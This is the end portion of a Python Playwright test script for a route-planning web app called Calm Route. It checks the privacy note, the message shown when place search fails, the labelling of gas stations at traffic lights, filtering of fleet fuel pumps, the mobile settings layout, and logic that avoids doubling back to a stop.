    page = T.new_page(b, query=f"?stadiaKey={T.STADIA_KEY}")
    check("a brand-new driver starts in Simple view", page.evaluate("profile.view") == "simple")
    page.context.close()
    page = T.new_page(b, profile={"merge":2})
    check("a profile saved before Simple view existed keeps the full view", page.evaluate("profile.view") == "full")
    txt = page.text_content("#privacyBox")
    check("the privacy note says data stays in the browser and names who sees what", "no Calm Route server" in txt and "National Weather Service" in txt and "fueleconomy.gov" in txt and "demo servers" in page.text_content("#privMap"), txt[:120])
    check("with no feedback address set, the feedback link stays hidden", page.evaluate("$('feedbackRow').hidden") is True)
    regs = page.evaluate("SIGNAL_REGIONS.map(r => r.id)")
    check("Indiana and Ohio traffic-light areas are listed", regs == ["US-MI", "US-IN", "US-OH"], regs)
    ok = page.evaluate("loadSignals(SIGNAL_REGIONS[1]).then(() => signalSets['US-IN'] === null && lightNear([40.0, -86.0]) === null)")
    check("until the Indiana file exists, Indiana lefts fall back quietly to the careful wording", ok is True, ok)
    check("no errors with the privacy and lights changes", not page.errors, page.errors)
    page.context.close()
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    check("with a Stadia key the privacy note names Stadia Maps", page.text_content("#privMap") == "Stadia Maps")
    page.context.close()
    # When the place search fails, say so: "couldn't look" is not "nothing there"
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    page.route("**/geocoding/v1/search*", lambda r: r.fulfill(status=503, body="{}"))
    page.click("#stopBox [data-stop=gas]"); page.wait_for_function("!/Looking along/.test($('stopList').textContent)", timeout=30000)
    check("if the place search fails, the stop list says it couldn't check, not that nothing is there", "isn’t answering" in page.text_content("#stopList"), page.text_content("#stopList"))
    page.check("#needGas"); page.wait_for_function("/answering|No gas/.test($('status').textContent)", timeout=30000)
    check("Need gas says the search isn't answering instead of 'no gas station'", "isn’t answering" in page.text_content("#status") and not page.evaluate("state.stops.length"), page.text_content("#status"))
    check("no errors when the place search fails", not page.errors, page.errors)
    page.context.close()
    # A left-side station at a corner with a light, "next door" means the same side, and twin place names
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    pts = page.evaluate("""(() => { const s = state.sel.shape, c = state.sel.cum;
        const pick = mi => { const i = c.findIndex(x => x >= mi); const a = s[i], b = s[i + 1], kx = Math.cos(a[0] * Math.PI / 180);
          const dx = (b[1] - a[1]) * kx, dy = b[0] - a[0], L = Math.hypot(dx, dy), off = 0.0004;
          return {on:a, right:[a[0] - dx / L * off, a[1] + dy / L * off / kx], left:[a[0] + dx / L * off, a[1] - dy / L * off / kx]}; };
        return {p:pick(1.0)}; })()""")
    T.LEFT_AT[0], T.LEFT_AT[1] = pts["p"]["left"]; T.STOP_AT[0], T.STOP_AT[1] = 0.0, 0.0
    on = pts["p"]["on"]
    page.evaluate(f"""(() => {{ const p = [{on[0]}, {on[1]}], key = Math.floor(p[0] / SIGNAL_CELL) + ':' + Math.floor(p[1] / SIGNAL_CELL);
        Object.keys(signalSets).forEach(k => delete signalSets[k]); signalSets['US-MI'] = {{bbox:[41, -91, 49, -82], grid:new Map([[key, [p]]]), n:1}}; }})()""")
    page.click("#stopBox [data-stop=gas]"); page.wait_for_selector("#stopList [data-addstop]", timeout=10000)
    items = page.locator("#stopList li").all_inner_texts()
    check("a left-side station at a traffic light is labelled 'on your left, at a light'", any("Shell" in i and "at a light" in i for i in items), items)
    sc = page.evaluate("findStops('gas', true).then(o => o.filter(x => x.main === 'Shell').map(x => [x.atLight, +x.score.toFixed(2)]))")
    check("and it costs less than a left with no light", sc and sc[0][0] is True and sc[0][1] < 1.5, sc)
    page.context.close()
    T.LEFT_AT[0] = T.LEFT_AT[1] = 0
    T.FOOD_AT[0] = T.FOOD_AT[1] = 0
    page = T.new_page(b, profile={})
    page.evaluate("""(() => { places.recent = [{main:'Walmart Supercenter', sub:'Westnedge Avenue, Portage, MI', lat:42.2, lon:-85.59},
        {main:'Walmart Supercenter', sub:'Gull Road, Kalamazoo, MI', lat:42.31, lon:-85.53}]; renderQuick(); })()""")
    chips = page.locator("#quick .recent").all_inner_texts()
    check("two saved places with the same name show their street", any("Westnedge" in c for c in chips) and any("Gull" in c for c in chips), chips)
    it = page.evaluate("toItem({type:'Feature', geometry:{coordinates:[-85.59, 42.22]}, properties:{name:'Mall Drive', street:'Mall Drive', city:'Portage', state:'Michigan', osm_key:'highway', osm_value:'secondary'}}, null)")
    check("a street's name isn't repeated in its address ('Mall Drive, Mall Drive')", it["sub"].count("Mall Drive") == 0, it["sub"])
    check("no errors with the stop and label fixes", not page.errors, page.errors)
    page.context.close()
    # Government and fleet pumps are never stops; a plain "Gas" match is never picked automatically
    page = T.new_page(b, profile={})
    bad = page.evaluate("""['Portage City Streets & Equipment', 'City of Portage Fuel', 'Kalamazoo County DPW Gas', 'Fleet Fueling', 'Employees Only Gas'].filter(n => !STOP_BAD.test(n))""")
    check("city yards, county garages and fleet pumps are filtered out", bad == [], bad)
    ok = page.evaluate("""['Shell', 'Meijer Gas Station', 'Speedway', 'Marathon', 'Costco Gas'].filter(n => STOP_BAD.test(n))""")
    check("real stations still get through", ok == [], ok)
    check("a plain 'Gas' name is not a brand, so Need gas never picks it",
          page.evaluate("[isBrand('gas', 'Corner Gas'), isBrand('gas', 'Meijer Gas'), isBrand('gas', 'Speedway'), isBrand('coffee', 'Coffee Corner')]") == [False, True, True, False])
    page.context.close()
    # Phone polish: the settings row folds away; picking a start moves on to the destination; credits name the service
    page = T.new_page(b, profile={}, mobile=True, width=390, height=844, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    check("on a phone the app/pins/copy-link row is folded away", not page.is_visible("#actionRow") and page.is_visible("#optsToggle"))
    page.click("#optsToggle")
    check("Settings opens it", page.is_visible("#actionRow") and page.get_attribute("#optsToggle", "aria-expanded") == "true")
    check("the credits name Stadia when it's in use", "Stadia Maps" in page.text_content("#credRoute"))
    page.context.close()
    page = T.new_page(b, profile={})
    check("on a computer the settings row is always shown, with no toggle", page.evaluate("getComputedStyle($('optsToggle')).display") == "none")
    page.fill("#from", "42.2005, -85.6225"); page.wait_for_selector("#from-s [role=option]", timeout=10000); page.locator("#from-s [role=option]").first.dispatch_event("mousedown")
    page.wait_for_timeout(200)
    check("picking a start moves straight on to the destination box", page.evaluate("document.activeElement.id") == "to")
    page.context.close()
    # Doubling back: leaving a stop back along the road you came in on (tonight's Marathon at Centre and US-131)
    page = T.new_page(b, profile={})
    r = page.evaluate("""(() => { const N = (la, lo) => [42.2 + la / 69.17, -85.6 + lo / (69.17 * Math.cos(42.2 * Math.PI / 180))];
        const line = (a, b, n = 20) => Array.from({length:n + 1}, (_, i) => N(a[0] + (b[0] - a[0]) * i / n, a[1] + (b[1] - a[1]) * i / n));
        // north 0.5 mi, then west a block to the station, then back east past the corner and on
        const backIn = [...line([0, 0], [0.5, 0]), ...line([0.5, 0], [0.5, -0.15]).slice(1)], backOut = [...line([0.5, -0.15], [0.5, 0.6])];
        // a station right on the road: east in, east out
        const onIn = line([0, -0.5], [0, 0]), onOut = line([0, 0], [0, 0.5]);
        // a station on the corner: north in, east out
        const cIn = line([-0.5, 0], [0, 0]), cOut = line([0, 0], [0, 0.5]);
        return [doublesBack(backIn, backOut), doublesBack(onIn, onOut), doublesBack(cIn, cOut)]; })()""")
    check("a stop a block past the corner (go, then come back the same way) counts as doubling back", r[0] is True, r)
    check("a stop right on the road, or on the corner where you turn, does not", r[1] is False and r[2] is False, r)
    page.context.close()
    # With a stop set, the calm pick never turns around for it, even if that route scores calmer
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    ok = page.evaluate("""(() => { const a = state.sel, s = a.shape[Math.floor(a.shape.length / 2)];
        state.trip.stops = [{kind:'gas', main:'Marathon', lat:s[0], lon:s[1]}];
        const back = Object.assign(Object.create(Object.getPrototypeOf(a)), a, {mins:a.mins - 5, _bt:true}), fwd = Object.assign({}, a, {_bt:false});
        const pick = calmestOf([back, fwd]); state.trip.stops = []; return pick === fwd; })()""")
    check("with a stop, a route that doubles back to it is never the calm pick", ok is True, ok)
    page.context.close()
    # A station on the road but behind you (doubling back) is not picked: the real drive is timed with and without it
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    T.STOP_AT[0], T.STOP_AT[1] = page.evaluate("(() => { const s = state.sel.shape, c = state.sel.cum; return s[c.findIndex(x => x >= 1.0)]; })()")
    T.DETOUR["on"] = True
    page.check("#needGas"); page.wait_for_function("/doubling back|planned without/.test($('status').textContent)", timeout=30000)
    check("a station that adds 10 minutes of doubling back is skipped, and the app says why", "doubling back" in page.text_content("#status") and not page.evaluate("state.stops.length"), page.text_content("#status"))
    T.DETOUR["on"] = False
    page.uncheck("#needGas"); page.check("#needGas")
    page.wait_for_function("state.trip && state.trip.stops.length && !$('app').classList.contains('busy')", timeout=30000)
    check("the same station with no detour is picked", page.evaluate("state.trip.stops[0].main") == "Speedway")
    check("no errors with the detour check", not page.errors, page.errors)
    page.context.close()
    b.close()
failed = [n for n, ok in results if not ok]
print(f"\n{len(results) - len(failed)} passed, {len(failed)} failed")
sys.exit(1 if failed else 0)
